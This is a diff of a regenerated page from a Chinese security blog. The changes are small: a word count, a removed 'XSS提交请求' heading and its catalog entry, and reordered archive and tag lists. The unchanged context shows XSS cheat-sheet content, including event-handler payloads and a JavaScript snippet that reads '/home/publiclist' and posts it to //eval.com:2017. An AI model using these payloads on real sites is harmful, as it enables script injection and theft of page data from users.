@@ -261,7 +261,7 @@
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count">1,704</span> / Reading time: <span class="post-count">9 min</span></span>
+                        <span>Word count: <span class="post-count">1,699</span> / Reading time: <span class="post-count">9 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -541,7 +541,7 @@
 <p>echo ‘<input type="text" value="' + strip_tags($str) +'">Please input the t1 as parameter’;<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">payload:</span><br></pre></td></tr></table></figure></p>
 <p>“ onmouseover=alert(1) //<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## xsspayload:</span><br><span class="line"></span><br><span class="line">`&lt;img src=//eval.com:2222&gt;`</span><br><span class="line"></span><br><span class="line">`&lt;svg onload=prompt(/xss/)&gt;`</span><br><span class="line"></span><br><span class="line">`&lt;embed/src=//goo.gl/nlX0P&gt;`</span><br><span class="line"></span><br><span class="line">`&lt;marquee/onstart=confirm(2)&gt;`</span><br><span class="line"></span><br><span class="line">## xss 读源码</span><br></pre></td></tr></table></figure></p>
 <p>function send(e) {<br>    var t = new XMLHttpRequest;<br>    t.open(“POST”, “//eval.com:2017”, !0),<br>    t.setRequestHeader(“Content-type”, “text/plain”),<br>    t.onreadystatechange = function() {<br>        4 == t.readyState &amp;&amp; t.status<br>    },<br>    t.send(e);<br>}<br>function getsource(src){<br>    var t = new XMLHttpRequest;<br>    t.open(“GET”, src, !0),<br>    t.setRequestHeader(“Content-type”, “text/plain”),<br>    t.onreadystatechange = function() {<br>        4 == t.readyState &amp;&amp; t.status<br>    },<br>    t.onload=function(e){<br>        send(e.target.responseText);<br>    }<br>    t.send();<br>}<br>getsource(“/home/publiclist”);<br><code>`</code></p>
-<h2 id="XSS提交请求"><a href="#XSS提交请求" class="headerlink" title="XSS提交请求"></a>XSS提交请求</h2>
+
     </article>
     <!-- license  -->
     
@@ -679,7 +679,7 @@
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#CRLF-注射攻击（HTTP-ResponseSplitting）-HRS"><span class="toc-number">1.</span> <span class="toc-text">CRLF 注射攻击（HTTP ResponseSplitting）(HRS)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MHTML协议安全-IE浏览器"><span class="toc-number">2.</span> <span class="toc-text">MHTML协议安全[IE浏览器]</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用Data-URIs进行XSS"><span class="toc-number">3.</span> <span class="toc-text">利用Data URIs进行XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#img编码绕过"><span class="toc-number">4.</span> <span class="toc-text">img编码绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#a绕过-javascript伪协议"><span class="toc-number">5.</span> <span class="toc-text">a绕过,javascript伪协议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#body和div"><span class="toc-number">6.</span> <span class="toc-text">body和div</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#过滤括号"><span class="toc-number">7.</span> <span class="toc-text">过滤括号</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#过滤-39-quot-39-39"><span class="toc-number">8.</span> <span class="toc-text">过滤&#39;,&quot;,&#39; &#39;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#过滤尖括号里边的所有东西"><span class="toc-number">9.</span> <span class="toc-text">过滤尖括号里边的所有东西</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#js中的连接符"><span class="toc-number">10.</span> <span class="toc-text">js中的连接符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#危险字符"><span class="toc-number">11.</span> <span class="toc-text">危险字符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS提交请求"><span class="toc-number">12.</span> <span class="toc-text">XSS提交请求</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#CRLF-注射攻击（HTTP-ResponseSplitting）-HRS"><span class="toc-number">1.</span> <span class="toc-text">CRLF 注射攻击（HTTP ResponseSplitting）(HRS)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MHTML协议安全-IE浏览器"><span class="toc-number">2.</span> <span class="toc-text">MHTML协议安全[IE浏览器]</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用Data-URIs进行XSS"><span class="toc-number">3.</span> <span class="toc-text">利用Data URIs进行XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#img编码绕过"><span class="toc-number">4.</span> <span class="toc-text">img编码绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#a绕过-javascript伪协议"><span class="toc-number">5.</span> <span class="toc-text">a绕过,javascript伪协议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#body和div"><span class="toc-number">6.</span> <span class="toc-text">body和div</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#过滤括号"><span class="toc-number">7.</span> <span class="toc-text">过滤括号</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#过滤-39-quot-39-39"><span class="toc-number">8.</span> <span class="toc-text">过滤&#39;,&quot;,&#39; &#39;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#过滤尖括号里边的所有东西"><span class="toc-number">9.</span> <span class="toc-text">过滤尖括号里边的所有东西</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#js中的连接符"><span class="toc-number">10.</span> <span class="toc-text">js中的连接符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#危险字符"><span class="toc-number">11.</span> <span class="toc-text">危险字符</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -1837,9 +1837,172 @@
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 75
+        Total : 76
         </div>
         <!-- search  -->
         
@@ -1870,6 +2033,11 @@
     
         <li class="archive-post-item">
             <span class="archive-post-date">03/06</span><a class="archive-post-title" href="/posts/53933/">算法刷刷刷</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/24</span><a class="archive-post-title" href="/posts/43363/">java-面试准备</a>
         </li>
     
     
@@ -2143,12 +2311,12 @@
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">06/08</span><a class="archive-post-title" href="/posts/5359/">sqlmap使用</a>
+            <span class="archive-post-date">06/08</span><a class="archive-post-title" href="/posts/29112/">pwn备忘录</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">06/08</span><a class="archive-post-title" href="/posts/29112/">pwn备忘录</a>
+            <span class="archive-post-date">06/08</span><a class="archive-post-title" href="/posts/5359/">sqlmap使用</a>
         </li>
     
     
@@ -2253,9 +2421,9 @@
     
         <span class="sidebar-tag-name" data-tags="pwn"><span class="iconfont-archer">&#xe606;</span>pwn</span>
     
-        <span class="sidebar-tag-name" data-tags="web安全"><span class="iconfont-archer">&#xe606;</span>web安全</span>
-    
         <span class="sidebar-tag-name" data-tags="ctf"><span class="iconfont-archer">&#xe606;</span>ctf</span>
+    
+        <span class="sidebar-tag-name" data-tags="web安全"><span class="iconfont-archer">&#xe606;</span>web安全</span>
     
         <span class="sidebar-tag-name" data-tags="ctf_php_debug"><span class="iconfont-archer">&#xe606;</span>ctf_php_debug</span>
     
@@ -2267,9 +2435,9 @@
     
         <span class="sidebar-tag-name" data-tags="运维"><span class="iconfont-archer">&#xe606;</span>运维</span>
     
-        <span class="sidebar-tag-name" data-tags="jvm"><span class="iconfont-archer">&#xe606;</span>jvm</span>
-    
         <span class="sidebar-tag-name" data-tags="linux"><span class="iconfont-archer">&#xe606;</span>linux</span>
+    
+        <span class="sidebar-tag-name" data-tags="jvm"><span class="iconfont-archer">&#xe606;</span>jvm</span>
     
         <span class="sidebar-tag-name" data-tags="mysql"><span class="iconfont-archer">&#xe606;</span>mysql</span>
     
@@ -2283,9 +2451,9 @@
     
         <span class="sidebar-tag-name" data-tags="zookeeper"><span class="iconfont-archer">&#xe606;</span>zookeeper</span>
     
-        <span class="sidebar-tag-name" data-tags="渗透测试"><span class="iconfont-archer">&#xe606;</span>渗透测试</span>
-    
         <span class="sidebar-tag-name" data-tags="安全体系建设"><span class="iconfont-archer">&#xe606;</span>安全体系建设</span>
+    
+        <span class="sidebar-tag-name" data-tags="渗透测试"><span class="iconfont-archer">&#xe606;</span>渗透测试</span>
     
     </div>
     <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
